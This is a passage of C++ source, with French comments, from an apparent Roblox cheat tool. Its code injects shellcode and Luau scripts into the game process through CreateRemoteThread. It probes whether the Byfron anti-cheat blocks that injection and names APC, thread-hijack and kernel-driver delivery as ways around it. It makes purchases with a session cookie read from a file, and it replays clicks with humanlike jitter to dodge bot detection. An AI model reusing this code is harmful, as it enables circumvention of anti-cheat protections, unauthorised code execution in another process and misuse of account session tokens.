// alors étendue à l'unicité et sauvegardée dans luau_sigs.txt.
// ATTENTION : sonde du code inconnu dans le processus Roblox = risque de crash
// du jeu si un candidat n'est pas luau_load (thread distant).
// ---------------------------------------------------------------------------
int RunAutoFixDemo(const std::vector<const char*>& positional) {
    std::cout << "=== Autofix luau_load : probe par execution ===\n\n";

    if (!IsProcessElevated()) {
        std::cerr << "Elevation UAC requise (processus Roblox protege).\n";
        return 1;
    }
    if (!EnableDebugPrivilege())
        std::cerr << "Avertissement : SeDebugPrivilege indisponible.\n";

    DWORD pid = 0;
    if (!positional.empty()) {
        if (auto p = ResolveTargetPid(positional[0])) pid = *p;
        else { std::cerr << "Cible invalide : " << positional[0] << '\n'; return 1; }
    }
    if (!pid) { std::cerr << "Aucune cible. Usage : aob.exe --autofix <pid|exe>\n"; return 1; }

    UniqueHandle proc = OpenTargetProcess(pid);
    if (!proc) return 1;

    auto mods = EnumModules(pid);
    const ModuleInfo* mod = ChooseRobloxModule(mods);
    if (!mod) { std::cerr << "Module Roblox introuvable.\n"; return 1; }
    std::cout << "Module : 0x" << std::hex << mod->base << std::dec << "  (" << mod->size
              << " octets)\n";

    // Ancres INDEPENDANTES de luau_load : lua_State + lua_pcall (signatures sûres).
    LuauVM vm;
    if (!ResolveLuauFunctionAny(proc.get(), *mod, LuauEscapeSigs::kLuaPcall, vm.luaPcall, "lua_pcall"))
        ResolveLuauFunctionAny(proc.get(), *mod, LuauEscapeSigs::kRbxPcall, vm.luaPcall, "rbx_pcall");
    std::cout << "[state] recherche d'un lua_State dans les piles des threads scripts...\n";
    vm.state = FindLuaStateFromScriptThreads(pid);
    if (!vm.state) vm.state = FindLuaStateInModule(proc.get(), *mod);
    if (!vm.state) vm.state = FindLuaStateInDataModel(proc.get(), *mod);
    if (!vm.state || !vm.luaPcall) {
        std::cerr << "Ancres indisponibles (state 0x" << std::hex << vm.state
                  << ", lua_pcall 0x" << vm.luaPcall << std::dec << ").\n"
                  << "  -> fournis lua_State/lua_pcall en hexa (signatures trop anciennes ?).\n";
        return 1;
    }
    std::cout << "  lua_state : 0x" << std::hex << vm.state
              << "  lua_pcall : 0x" << vm.luaPcall << std::dec << '\n';

    size_t nScanned = 0;
    std::vector<SigCandidate> scored = CollectLuauCandidates(proc.get(), *mod, &nScanned);
    std::cout << "\n[scan] " << nScanned << " candidat(s) de la famille luau_load.\n";
    if (scored.empty()) { std::cerr << "  Aucun prologue connu.\n"; return 2; }

    const char* kProbe =
        "local result = 1 + 1\n"
        "print('[autofix] probe ok, result =', result)\n";

    size_t nb = (std::min)(scored.size(), size_t{8});
    std::cout << "\nSonde : " << kProbe << "\n";
    std::cout << "Sondage des " << nb << " meilleurs candidats (risque : crash du jeu si un\n"
              << "candidat n'est pas luau_load).\n\n";

    for (size_t i = 0; i < nb; ++i) {
        vm.luauLoad = scored[i].addr;
        std::cout << "  [" << (i + 1) << "/" << nb << "] 0x" << std::hex << vm.luauLoad
                  << std::dec << "  (callers " << scored[i].callers << ")  ...  ";
        std::cout.flush();
        int load = -1, pcall = -1;
        bool ok = ExecuteLuauSnippet(proc.get(), vm, kProbe, std::strlen(kProbe), &load, &pcall);
        std::cout << "luau_load => " << load << ", lua_pcall => " << pcall
                  << "  (" << (ok ? "SUCCES" : "ECHEC") << ")\n";
        if (ok && load == 0 && pcall == 0) {
            // Le bon luau_load : étend sa signature à l'unicité et la sauvegarde.
            std::vector<uint8_t> mem(0x40, 0);
            SIZE_T got = 0;
            size_t have = (ReadProcessMemory(proc.get(), reinterpret_cast<LPCVOID>(vm.luauLoad),
                                             mem.data(), mem.size(), &got)) ? got : 0;
            std::string newSig;
            size_t len = 9;
            bool unique = false;
            while (len <= have && len <= mem.size()) {
                newSig = SigFromBytes(mem.data(), len);
                auto pat = ParsePattern(newSig);
                if (pat) {
                    auto hitsMod = FindAllPatternsInRemoteRange(proc.get(), mod->base,
                                                                mod->base + mod->size, *pat);
                    auto hitsAll = FindAllPatternsInRemoteProcess(proc.get(), *pat, 4);
                    if (hitsMod.size() == 1 && hitsMod[0] == vm.luauLoad && hitsAll.size() == 1) {
                        unique = true;
                        break;
                    }
                }
                ++len;
            }
            if (unique && SigStore::Append(newSig)) {
                std::cout << "\n  [OK] luau_load CONFIRME par execution a 0x" << std::hex
                          << vm.luauLoad << std::dec << ".\n"
                          << "  [OK] luau_sigs.txt mis a jour : " << newSig << "\n\n"
                          << "  Reessaie : aob.exe --gamepass " << positional[0]
                          << "  (ou --marketplace / --devproduct / --detect)\n";
            } else {
                std::cout << "\n  [OK] luau_load a 0x" << std::hex << vm.luauLoad
                          << std::dec << " fonctionne mais sa signature reste ambigue.\n"
                          << "  Utilise l'adresse en hexa explicitement :\n"
                          << "  aob.exe --gamepass " << positional[0] << " 0x" << std::hex
                          << vm.luauLoad << std::dec << "\n";
            }
            return 0;
        }
    }

    std::cerr << "\nAucun candidat n'a fait aboutir luau_load => 0 / lua_pcall => 0.\n"
              << "  -> si tous les candidats sortent -1/-1, Byfron bloque la livraison du\n"
              << "     thread distant (CreateRemoteThread) : essaie --apc ou --hijack.\n"
              << "  -> sinon la build a change trop fortement ; passe l'adresse en hexa.\n";
    return 2;
}

// ---------------------------------------------------------------------------
// PROBE-THREAD : diagnostic de livraison. Détermine si CreateRemoteThread +
// exécution de shellcode fonctionne DANS LA CIBLE, SANS appeler aucun candidat.
//   Test A : stub brut qui écrit un marqueur -> "injection basique OK ?"
//   Test B : IDENTIQUE au stub d'exécution réel mais avec un `call` vers du code
//            inoffensif (xor eax,eax; ret) avant d'écrire le marqueur.
// Interprétation :
//   A et B  = OK    -> le thread s'exécute ; le -1/-1 des candidats vient des
//                      candidats eux-mêmes (crash / hang du thread distant).
//   A OK, B KO      -> détection de comportement suspect (call indirect) même
//                      inoffensif => Byfron tue le thread.
//   A KO            -> CreateRemoteThread est bloqué / tué => livraison à revoir.
// ---------------------------------------------------------------------------
int RunProbeThreadDemo(const std::vector<const char*>& positional) {
    std::cout << "=== Probe thread distant : la livraison du stub est-elle bloquee ? ===\n\n";

    if (!IsProcessElevated()) {
        std::cerr << "Elevation UAC requise (processus Roblox protege).\n";
        return 1;
    }
    if (!EnableDebugPrivilege())
        std::cerr << "Avertissement : SeDebugPrivilege indisponible.\n";

    DWORD pid = 0;
    if (!positional.empty()) {
        if (auto p = ResolveTargetPid(positional[0])) pid = *p;
        else { std::cerr << "Cible invalide : " << positional[0] << '\n'; return 1; }
    }
    if (!pid) { std::cerr << "Aucune cible. Usage : aob.exe --probe-thread <pid|exe>\n"; return 1; }

    UniqueHandle proc = OpenTargetProcess(pid);
    if (!proc) return 1;

    const uint32_t kMarker = 0x7E57C0DE;

    LPBYTE status = static_cast<LPBYTE>(
        AllocRemoteMemory(proc.get(), 16, PAGE_READWRITE));
    if (!status) { std::cerr << "VirtualAllocEx (status) a echoue : " << GetLastError() << '\n'; return 1; }

    auto runStub = [&](const std::vector<uint8_t>& stub, const char* label) -> bool {
        LPVOID remote = AllocateAndWriteStub(proc.get(), stub.data(), stub.size());
        if (!remote) return false;
        uint32_t zero = 0;
        WriteRemoteMemory(proc.get(), status, &zero, 4);
        HANDLE t = CreateRemoteThread(proc.get(), nullptr, 0,
                                      reinterpret_cast<LPTHREAD_START_ROUTINE>(remote),
                                      status, 0, nullptr);
        if (!t) {
            std::cerr << "  [" << label << "] CreateRemoteThread KO : " << GetLastError() << '\n';
            VirtualFreeEx(proc.get(), remote, 0, MEM_RELEASE);
            return false;
        }
        bool ran = WaitForSingleObject(t, 5000) == WAIT_OBJECT_0;
        CloseHandle(t);
        uint32_t got = 0;
        SIZE_T rLen = 0;
        ReadProcessMemory(proc.get(), status, &got, 4, &rLen);
        VirtualFreeEx(proc.get(), remote, 0, MEM_RELEASE);
        bool ok = ran && got == kMarker;
        std::cout << "  [" << label << "] " << (ok ? "OK   " : "BLOQUE/PERTURBE ")
                  << "(thread " << (ran ? "termine" : "= timeout") << ", marqueur 0x"
                  << std::hex << got << std::dec << ")\n";
        return ok;
    };

    // -- Test A : mov eax, marker ; mov [rcx], eax ; ret ---------------------
    std::vector<uint8_t> stubA = { 0xB8, 0, 0, 0, 0,   // mov eax, imm32
                                   0x89, 0x01,          // mov [rcx], eax
                                   0xC3 };              // ret
    stubA[1] = static_cast<uint8_t>(kMarker);
    stubA[2] = static_cast<uint8_t>(kMarker >> 8);
    stubA[3] = static_cast<uint8_t>(kMarker >> 16);
    stubA[4] = static_cast<uint8_t>(kMarker >> 24);

    // -- Test B : sub rsp,8 ; mov rax,<ret0> ; call rax ; add rsp,8 ; écriture
    static const uint8_t kRet0[] = { 0x31, 0xC0, 0xC3 };   // xor eax,eax ; ret
    LPVOID targetRet0 = AllocateAndWriteStub(proc.get(), kRet0, sizeof(kRet0));
    if (!targetRet0) return 1;
    std::vector<uint8_t> stubB = { 0x48, 0x83, 0xEC, 0x08,               // sub  rsp, 8
                                   0x48, 0xB8, 0,0,0,0, 0,0,0,0,          // mov  rax, imm64
                                   0xFF, 0xD0,                            // call rax
                                   0x48, 0x83, 0xC4, 0x08,               // add  rsp, 8
                                   0xB8, 0, 0, 0, 0,                      // mov  eax, marker
                                   0x89, 0x01,                            // mov  [rcx], eax
                                   0xC3 };                                // ret
    uintptr_t tgt = reinterpret_cast<uintptr_t>(targetRet0);
    for (int k = 0; k < 8; ++k) stubB[6 + k] = static_cast<uint8_t>((tgt >> (8 * k)) & 0xFF);
    stubB[21] = static_cast<uint8_t>(kMarker);
    stubB[22] = static_cast<uint8_t>(kMarker >> 8);
    stubB[23] = static_cast<uint8_t>(kMarker >> 16);
    stubB[24] = static_cast<uint8_t>(kMarker >> 24);

    std::cout << "\nTest A : stub brut sans appel -> marqueur 0x" << std::hex << kMarker
              << std::dec << "\n";
    bool a = runStub(stubA, "A");
    std::cout << "Test B : call indirect vers code inoffensif -> marqueur 0x"
              << std::hex << kMarker << std::dec << "\n";
    bool b = runStub(stubB, "B");
    VirtualFreeEx(proc.get(), targetRet0, 0, MEM_RELEASE);
    VirtualFreeEx(proc.get(), status, 0, MEM_RELEASE);

    // -- Test M : mémoire pure, SANS thread. Alloue + écrit un marqueur + relit.
    //   Révèle si l'ALLOCATION est shadowed (l'adresse retournée n'est pas la
    //   vraie) ou si l'ÉCRITURE est absorbée (NtWriteVirtualMemory/WPM hookés).
    {
        const uint32_t kWriteCheck = 0x4D4D5704;  // écrit par l'hôte, PAS par un thread
        LPBYTE buf = static_cast<LPBYTE>(AllocRemoteMemory(proc.get(), 16, PAGE_READWRITE));
        bool m_ok = false;
        std::cout << "\nTest M : allocation + ecriture + relecture (sans thread)...\n";
        if (buf) {
            WriteRemoteMemory(proc.get(), buf, &kWriteCheck, sizeof(kWriteCheck));
            uint32_t readBack = 0;
            SIZE_T rLen = 0;
            ReadProcessMemory(proc.get(), buf, &readBack, 4, &rLen);
            m_ok = (readBack == kWriteCheck);
            std::cout << "  [M] " << (m_ok ? "OK   " : "CORROMPU ")
                      << "(ecrit 0x" << std::hex << kWriteCheck << ", relu 0x"
                      << readBack << std::dec << ")\n";
            VirtualFreeEx(proc.get(), buf, 0, MEM_RELEASE);
            if (!m_ok) {
                std::cout << "  -> l'allocation retourne une adresse ''ombre'' OU l'ecriture est\n"
                          << "     absorbee par l'anti-cheat => TOUTE ecriture distant est bloquee.\n"
                          << "     Uniquement une livraison par kernel driver / hyperviseur peut\n"
                          << "     fonctionner (ou --hijack si SetThreadContext passe).\n";
            }
        } else {
            std::cerr << "  [M] allocation impossible\n";
        }
        if (a && b && m_ok) {
            std::cout << "\n=> Tout fonctionne : le -1/-1 vient des candidats. Passe le bon\n"
                      << "   luau_load en hexa (ex : aob.exe --gamepass " << positional[0]
                      << " 0xADDR).\n";
            return 0;
        }
    }

    if (a && b) {
        std::cout << "\n=> La livraison CreateRemoteThread FONCTIONNE. Le -1/-1 des candidats\n"
                  << "   vient donc des candidats eux-memes (ils crashent/blockent le thread\n"
                  << "   avant d'ecrire leur statut) ; passe l'adresse du bon luau_load en hexa.\n";
        return 0;
    }
    if (a && !b) {
        std::cout << "\n=> Un thread nu tourne, mais le `call` indirect est neutralise :\n"
                  << "   detection de comportement (Byfron) sur le code injecte. Essaie --apc\n"
                  << "   (thread existant, moins suspect) ou une livraison au thread script.\n";
        return 3;
    }
    std::cout << "\n=> CreateRemoteThread est bloque/neutralise dans cette cible.\n"
              << "   Essaie --apc ou --hijack (aucun nouveau thread cree).\n";
    return 4;
}
#endif // _WIN32

// ===========================================================================
// URL Routing Engine — Dependency Injection pour le reseau.
// Remplace le domaine de production par localhost:8080 quand le mode sandbox
// est actif. Accepte une URL complète OU un simple hostname. En sandbox, le
// scheme est normalise en http (le mock local ne parle pas TLS).
// Thread-safe : lecture atomique de g_sandbox_mode (memory_order_relaxed).
// ===========================================================================
inline std::string resolve_endpoint(const std::string& host_or_url) {
    if (!g_sandbox_mode.load(std::memory_order_relaxed)) return host_or_url;

    // URL complète (contient "://") : extraire le host et le remplacer.
    auto scheme_end = host_or_url.find("://");
    if (scheme_end != std::string::npos) {
        auto host_start = scheme_end + 3;
        auto host_end = host_or_url.find('/', host_start);
        if (host_end == std::string::npos)
            return "http://localhost:8080";
        return "http://localhost:8080" + host_or_url.substr(host_end);
    }

    // Simple hostname (ex: "economy.roblox.com") -> "localhost" (sans port :
    // le port 8080 est passe separement par l'appelant, ex. WinHttpConnect).
    return "localhost";
}

// +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
// ROBLOX WEB API - achat gamepass / devproduct / marketplace via HTTPS.
// Aucun acces au processus Roblox, aucune elevation : uniquement le cookie
// .ROBLOSECURITY (lu depuis cookie.txt) + token CSRF.
//   POST https://auth.roblox.com/v2/logout -> header X-CSRF-TOKEN
//   GET  https://users.roblox.com/v1/users/authenticated
//   GET  https://economy.roblox.com/v1/users/<id>/currency
//   GET  https://apis.roblox.com/game-passes/v1/game-passes/<id>/product-info
//   GET  https://economy.roblox.com/v2/assets/<id>/details
//   GET  https://apis.roblox.com/marketplace-service/v1/products/<id>/details
//   POST https://economy.roblox.com/v1/purchases/products/<productId>
//          {"expectedCurrency":1,"expectedPrice":..,"expectedSellerId":..}
// +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#ifdef _WIN32

// --- Mini parseur JSON (suffisant pour les reponses Roblox) ----------------
namespace rbxjson {

struct Value {
    enum class T { Null, Bool, Number, String, Array, Object } t = T::Null;
    double number = 0;
    bool boolean = false;
    std::string str;
    std::vector<Value> arr;
    std::vector<std::pair<std::string, Value>> obj;

    bool isNull() const { return t == T::Null; }
    bool isObject() const { return t == T::Object; }
    long long asInt(long long fb = 0) const { return t == T::Number ? (long long)number : fb; }
    std::string asStr() const { return t == T::String ? str : std::string(); }
    const Value* find(const char* key) const {
        if (t != T::Object) return nullptr;
        for (const auto& kv : obj) if (kv.first == key) return &kv.second;
        return nullptr;
    }
};

struct Parser {
    std::string_view s;
    size_t i = 0;
    bool fail = false;

    explicit Parser(std::string_view src) : s(src) {}

    void skipWs() {
        while (i < s.size()) {
            char c = s[i];
            if (c == ' ' || c == '\t' || c == '\r' || c == '\n') ++i; else break;
        }
    }
    bool eof() const { return i >= s.size(); }
    char cur() const { return eof() ? '\0' : s[i]; }

    Value parseValue() {
        skipWs();
        char c = cur();
        if (c == '{') return parseObject();
        if (c == '[') return parseArray();
        if (c == '"') { Value v; v.t = Value::T::String; v.str = parseString().str; return v; }
        if (c == 't') { literal("true"); Value v; v.t = Value::T::Bool; v.boolean = true; return v; }
        if (c == 'f') { literal("false"); Value v; v.t = Value::T::Bool; v.boolean = false; return v; }
        if (c == 'n') { literal("null"); return Value(); }
        return parseNumber();
    }

    void literal(const char* lit) {
        size_t n = std::strlen(lit);
        if (s.size() - i < n || s.compare(i, n, lit) != 0) fail = true;
        i += n;
    }

    Value parseNumber() {
        Value v; v.t = Value::T::Number;
        size_t start = i;
        if (cur() == '-') ++i;
        while (i < s.size() && s[i] >= '0' && s[i] <= '9') ++i;
        if (i < s.size() && s[i] == '.') {
            ++i;
            while (i < s.size() && s[i] >= '0' && s[i] <= '9') ++i;
        }
        if (i < s.size() && (s[i] == 'e' || s[i] == 'E')) {
            ++i;
            if (i < s.size() && (s[i] == '+' || s[i] == '-')) ++i;
            while (i < s.size() && s[i] >= '0' && s[i] <= '9') ++i;
        }
        if (i == start) { fail = true; return v; }
        v.number = std::strtod(std::string(s.substr(start, i - start)).c_str(), nullptr);
        return v;
    }

    Value parseString() {
        Value v; v.t = Value::T::String;
        if (cur() != '"') { fail = true; return v; }
        ++i;
        std::string out;
        while (i < s.size()) {
            char c = s[i];
            if (c == '"') { ++i; v.str = std::move(out); return v; }
            if (c == '\\') {
                ++i;
                if (i >= s.size()) break;
                char e = s[i];
                switch (e) {
                    case '"': out.push_back('"'); break;
                    case '\\': out.push_back('\\'); break;
                    case '/': out.push_back('/'); break;
                    case 'b': out.push_back('\b'); break;
                    case 'f': out.push_back('\f'); break;
                    case 'n': out.push_back('\n'); break;
                    case 'r': out.push_back('\r'); break;
                    case 't': out.push_back('\t'); break;
                    case 'u': {
                        ++i;
                        unsigned cp = 0;
                        for (int k = 0; k < 4; ++k) {
                            if (i >= s.size()) { fail = true; return v; }
                            char h = s[i];
                            cp <<= 4;
                            if (h >= '0' && h <= '9') cp |= (unsigned)(h - '0');
                            else if (h >= 'a' && h <= 'f') cp |= (unsigned)(h - 'a' + 10);
                            else if (h >= 'A' && h <= 'F') cp |= (unsigned)(h - 'A' + 10);
                            else { fail = true; return v; }
                            ++i;
                        }
                        --i;
                        if (cp < 0x80) out.push_back((char)cp);
                        else if (cp < 0x800) {
                            out.push_back((char)(0xC0 | (cp >> 6)));
                            out.push_back((char)(0x80 | (cp & 0x3F)));
                        } else if (cp < 0x10000) {
                            out.push_back((char)(0xE0 | (cp >> 12)));
                            out.push_back((char)(0x80 | ((cp >> 6) & 0x3F)));
                            out.push_back((char)(0x80 | (cp & 0x3F)));
                        } else {
                            out.push_back((char)(0xF0 | (cp >> 18)));
                            out.push_back((char)(0x80 | ((cp >> 12) & 0x3F)));
                            out.push_back((char)(0x80 | ((cp >> 6) & 0x3F)));
                            out.push_back((char)(0x80 | (cp & 0x3F)));
                        }
                        break;
                    }
                    default: break;
                }
                ++i;
                continue;
            }
            out.push_back(c);
            ++i;
        }
        fail = true;
        return v;
    }

    Value parseArray() {
        Value v; v.t = Value::T::Array;
        ++i; skipWs();
        if (cur() == ']') { ++i; return v; }
        while (!eof()) {
            Value item = parseValue();
            if (fail) return v;
            v.arr.push_back(std::move(item));
            skipWs();
            char c = cur();
            if (c == ']') { ++i; return v; }
            if (c == ',') { ++i; continue; }
            fail = true; return v;
        }
        fail = true; return v;
    }

    Value parseObject() {
        Value v; v.t = Value::T::Object;
        ++i; skipWs();
        if (cur() == '}') { ++i; return v; }
        while (!eof()) {
            skipWs();
            if (cur() != '"') { fail = true; return v; }
            Value k = parseString();
            std::string key = std::move(k.str);
            skipWs();
            if (cur() != ':') { fail = true; return v; }
            ++i;
            Value item = parseValue();
            if (fail) return v;
            v.obj.emplace_back(std::move(key), std::move(item));
            skipWs();
            char c = cur();
            if (c == '}') { ++i; return v; }
            if (c == ',') { ++i; continue; }
            fail = true; return v;
        }
        fail = true; return v;
    }
};

inline Value Parse(std::string_view src) {
    Parser p(src);
    Value v = p.parseValue();
    if (p.fail) return Value();
    return v;
}

}  // namespace rbxjson

// --- Utils texte / cookie ---------------------------------------------------
static std::wstring RbxUtf8ToWide(const std::string& in) {
    if (in.empty()) return std::wstring();
    int n = MultiByteToWideChar(CP_UTF8, 0, in.data(), (int)in.size(), nullptr, 0);
    std::wstring out(n ? n : 0, L'\0');
    if (n > 0) MultiByteToWideChar(CP_UTF8, 0, in.data(), (int)in.size(), &out[0], n);
    return out;
}
static std::string RbxWideToUtf8(const std::wstring& in) {
    if (in.empty()) return std::string();
    int n = WideCharToMultiByte(CP_UTF8, 0, in.data(), (int)in.size(), nullptr, 0, nullptr, nullptr);
    std::string out(n ? n : 0, '\0');
    if (n > 0) WideCharToMultiByte(CP_UTF8, 0, in.data(), (int)in.size(), &out[0], n, nullptr, nullptr);
    return out;
}

// ---------------------------------------------------------------------------
// SNYPER : automation UI "humaine" pour le prompt d'achat in-game (gamepass Roblox).
//   - coordonnees normalisees (0..1) vs rect client de la fenetre cible
//     -> le meme script marche a n'importe quelle resolution
//   - trajectoires lissees (smoothstep + jitter) et timing jittere
//   - record : F9 = point, F10 = sauver script.txt
//   - play   : rejoue script.txt (F12=stop, TAB=pause, Esc=quitter)
//   - dryrun : rejoue sans cliquer (validation Enter/skip point par point)
//   script.txt : <xNorm> <yNorm> <delayMinMs> <delayMaxMs> <click:0|1>
// ---------------------------------------------------------------------------
struct SnyperPt { double x, y; long lo, hi; int click; };

static std::vector<SnyperPt> g_snyPts;
static volatile LONG g_snyRun   = 1;
static volatile LONG g_snyPause = 0;
static LONG g_snyLoop = 0;
static DWORD g_snyPidReq = 0;
static std::wstring g_snyTitle;
static HWND g_snyHit = nullptr;

static BOOL CALLBACK SnyperEnumPick(HWND h, LPARAM) {
    wchar_t cls[128] = {0}, txt[256] = {0};
    ::GetClassNameW(h, cls, 128);
    ::GetWindowTextW(h, txt, 256);
    DWORD apid = 0;
    ::GetWindowThreadProcessId(h, &apid);
    if (g_snyPidReq && apid != g_snyPidReq) return TRUE;
    bool roblox = _wcsicmp(cls, L"RobloxPlayer") == 0 ||
                  _wcsicmp(cls, L"RobloxPlayerBeta") == 0 ||
                  wcsstr(txt, L"Roblox") != nullptr;
    if (!roblox) return TRUE;
    if (!g_snyTitle.empty() && wcsstr(txt, g_snyTitle.c_str())) { g_snyHit = h; return FALSE; }
    if (g_snyTitle.empty()) { g_snyHit = h; return FALSE; }
    return TRUE;
}

static HWND SnyperFindTarget() {
    g_snyHit = nullptr;
    ::EnumWindows(SnyperEnumPick, 0);
    if (!g_snyHit && !g_snyPidReq && !g_snyTitle.empty())
        g_snyHit = ::FindWindowW(nullptr, g_snyTitle.c_str());
    if (!g_snyHit) g_snyHit = ::FindWindowW(L"Roblox", nullptr);
    return g_snyHit;
}

static void SnyperGetClientRectNorm(HWND h, POINT* origin, int* cw, int* ch) {
    RECT r;
    ::GetClientRect(h, &r);
    *cw = r.right;
    *ch = r.bottom;
    origin->x = r.left;
    origin->y = r.top;
    ::ClientToScreen(h, origin);
}

static void SnyperMoveEased(HWND h, double fx, double fy) {
    POINT o;
    int cw, ch;
    SnyperGetClientRectNorm(h, &o, &cw, &ch);
    int tx = (int)(o.x + cw * fx), ty = (int)(o.y + ch * fy);
    POINT c;
    ::GetCursorPos(&c);
    int steps = 18 + (int)((double)(abs(tx - c.x) + abs(ty - c.y)) / 9.0);
    for (int i = 1; i <= steps; ++i) {
        double t = (double)i / steps;
        double u = t * t * (3 - 2 * t);                // smoothstep
        double jx = 0, jy = 0;
        if (i && i < steps) { jx = (rand() % 3 - 1) * 0.4; jy = (rand() % 3 - 1) * 0.4; }
        ::SetCursorPos((int)(c.x + (tx - c.x) * u + jx), (int)(c.y + (ty - c.y) * u + jy));
        ::Sleep(8 + rand() % 9);
    }
    ::SetCursorPos(tx, ty);
}

static void SnyperClick(HWND h, double fx, double fy) {
    POINT o;
    int cw, ch;
    SnyperGetClientRectNorm(h, &o, &cw, &ch);
    int x = (int)(o.x + cw * fx), y = (int)(o.y + ch * fy);
    ::SetCursorPos(x, y);
    ::Sleep(30 + rand() % 60);
    INPUT d = {0};
    d.type = INPUT_MOUSE;
    d.mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
    INPUT u = {0};
    u.type = INPUT_MOUSE;
    u.mi.dwFlags = MOUSEEVENTF_LEFTUP;
    ::SendInput(1, &d, sizeof(INPUT));
    ::Sleep(50 + rand() % 90);
    ::SendInput(1, &u, sizeof(INPUT));
}

// --snyper-record [titre] : enregistre les clics (F9=point, F10=sauver).
int RunSnyperRecord(const std::vector<const char*>& positional) {
    if (!positional.empty()) g_snyTitle = RbxUtf8ToWide(positional[0]);
    HWND h = SnyperFindTarget();
    if (!h) { std::cerr << "[snyper] fenetre cible introuvable (fenetre Roblox ouverte ?).\n"; return 1; }
    std::string t = RbxWideToUtf8(g_snyTitle.empty() ? L"Roblox" : g_snyTitle);
    std::cout << "[snyper] record contre \"" << t
              << "\" — bouge la souris, F9=point, F10=finir\n";
    g_snyPts.clear();
    InterlockedExchange(&g_snyRun, 1);
    bool fin = false;
    while (!fin) {
        ::Sleep(30);
        if (::GetAsyncKeyState(VK_F9) & 1) {
            POINT p, o;
            int cw, ch;
            ::GetCursorPos(&p);
            SnyperGetClientRectNorm(h, &o, &cw, &ch);
            if (cw && ch) {
                SnyperPt pt = { (double)(p.x - o.x) / cw, (double)(p.y - o.y) / ch, 300, 900, 1 };
                g_snyPts.push_back(pt);
                std::cout << "  + point " << g_snyPts.size() << " @ (" << pt.x << ", " << pt.y << ")\n";
            } else {
                std::cout << "  [!] curseur hors rect client, ignore\n";
            }
        }
        if (::GetAsyncKeyState(VK_F10) & 1) fin = true;
    }
    FILE* f = std::fopen("script.txt", "wb");
    if (!f) { std::cerr << "[snyper] impossible d'ecrire script.txt\n"; return 1; }
    for (const SnyperPt& p : g_snyPts)
        std::fprintf(f, "%.6f %.6f %ld %ld %d\n", p.x, p.y, p.lo, p.hi, p.click);
    std::fclose(f);
    std::cout << "[snyper] ecrit " << g_snyPts.size() << " points dans script.txt\n";
    return 0;
}

static DWORD WINAPI SnyperHotkeyThread(LPVOID) {
    while (true) {
        ::Sleep(40);
        if (::GetAsyncKeyState(VK_F12) & 1) InterlockedExchange(&g_snyRun, 0);
        if (::GetAsyncKeyState(VK_TAB) & 1) {
            LONG old = InterlockedExchange(&g_snyPause, g_snyPause ? 0 : 1);
            std::cout << (old ? "[snyper] resume\n" : "[snyper] pause\n");
        }
        if (::GetAsyncKeyState(VK_ESCAPE) & (1 << 15)) { InterlockedExchange(&g_snyRun, 0); break; }
    }
    return 0;
}

// --snyper-play / --snyper-dryrun : rejoue script.txt dans la fenetre cible.
int RunSnyperPlay(bool dry, const std::vector<const char*>& positional) {
    if (!positional.empty()) g_snyTitle = RbxUtf8ToWide(positional[0]);
    HWND h = SnyperFindTarget();
    if (!h) { std::cerr << "[snyper] fenetre cible introuvable (fenetre Roblox ouverte ?).\n"; return 1; }
    FILE* f = std::fopen("script.txt", "rb");
    if (!f) { std::cerr << "[snyper] script.txt absent (lance d'abord --snyper-record)\n"; return 1; }
    g_snyPts.clear();
    double x, y;
    long lo, hi;
    int c;
    while (std::fscanf(f, "%lf %lf %ld %ld %d", &x, &y, &lo, &hi, &c) == 5)
        g_snyPts.push_back({ x, y, lo, hi, c });
    std::fclose(f);
    if (g_snyPts.empty()) { std::cerr << "[snyper] script.txt vide ou illisible\n"; return 1; }
    InterlockedExchange(&g_snyRun, 1);
    InterlockedExchange(&g_snyPause, 0);
    ::CreateThread(nullptr, 0, SnyperHotkeyThread, nullptr, 0, nullptr);
    std::cout << (dry ? "[snyper] DRYRUN de " : "[snyper] replay de ") << g_snyPts.size()
              << " points (F12=stop, TAB=pause, Esc=quitter)\n";
    std::srand((unsigned)::GetTickCount());
    do {
        for (size_t i = 0; i < g_snyPts.size() && g_snyRun; ++i) {
            while (g_snyPause && g_snyRun) ::Sleep(50);
            const SnyperPt& pt = g_snyPts[i];
            long d = pt.lo + (long)(std::rand() % (pt.hi - pt.lo + 1));
            ::Sleep((DWORD)d);
            SnyperMoveEased(h, pt.x, pt.y);
            if (dry) {
                char ans[16] = {0};
                std::cout << "[dry] point " << (i + 1) << " a (" << pt.x << ", " << pt.y
                          << ") — Entree=click, n=skip: ";
                std::fflush(stdout);
                if (std::fgets(ans, sizeof(ans), stdin) && (ans[0] == 'n' || ans[0] == 'N')) continue;
            }
            if (pt.click) SnyperClick(h, pt.x, pt.y);
        }
        std::cout << (g_snyLoop ? "[snyper] loop\n" : "[snyper] done\n");
    } while (g_snyLoop && g_snyRun);
    return 0;
}

static std::string RbxTrim(std::string s) {
    size_t a = s.find_first_not_of(" \t\r\n");
    if (a == std::string::npos) return std::string();
    size_t b = s.find_last_not_of(" \t\r\n");
    return s.substr(a, b - a + 1);
}

// Premiere ligne non vide (sans '#' en tete) de cookie.txt = cookie brut.
static bool RbxReadCookie(std::string& out) {
    std::ifstream f("cookie.txt");
    if (!f.is_open()) return false;
    std::string line;
    while (std::getline(f, line)) {
        std::string t = RbxTrim(line);
        if (t.empty() || t[0] == '#') continue;
        out = t;
        return true;
    }
    return false;
}

// --- Couche HTTP (WinHTTP) --------------------------------------------------
struct RbxHttpResult {
    DWORD status = 0;
    bool ok = false;
    std::string body;
    std::string xsrf;   // header X-CSRF-Token de la reponse
    std::string msg;
    rbxjson::Value json;
};

static RbxHttpResult RbxHttp(const char* method, const char* host, const char* path,
                             const std::string& cookie, const std::string& xsrf,
                             const std::string& postBody, DWORD timeoutMs = 30000) {
    RbxHttpResult out;
    const std::string resolvedHost = resolve_endpoint(std::string(host));
    const std::string proxy = GetProxyUrl();
    std::wstring wProxy;
    if (!proxy.empty())
        wProxy = RbxUtf8ToWide(proxy);
    // Transparent Proxy Interception : si un proxy de transit est configuré,
    // la session WinHTTP est ouverte en mode NAMED_PROXY -> tout le trafic
    // (y compris le tunnel CONNECT HTTPS) passe par l'intercepteur. Chaîne
    // vide => WINHTTP_ACCESS_TYPE_DEFAULT_PROXY (comportement d'origine).
    HINTERNET hSession = WinHttpOpen(L"aob/1.0",
                                     proxy.empty() ? WINHTTP_ACCESS_TYPE_DEFAULT_PROXY
                                                   : WINHTTP_ACCESS_TYPE_NAMED_PROXY,
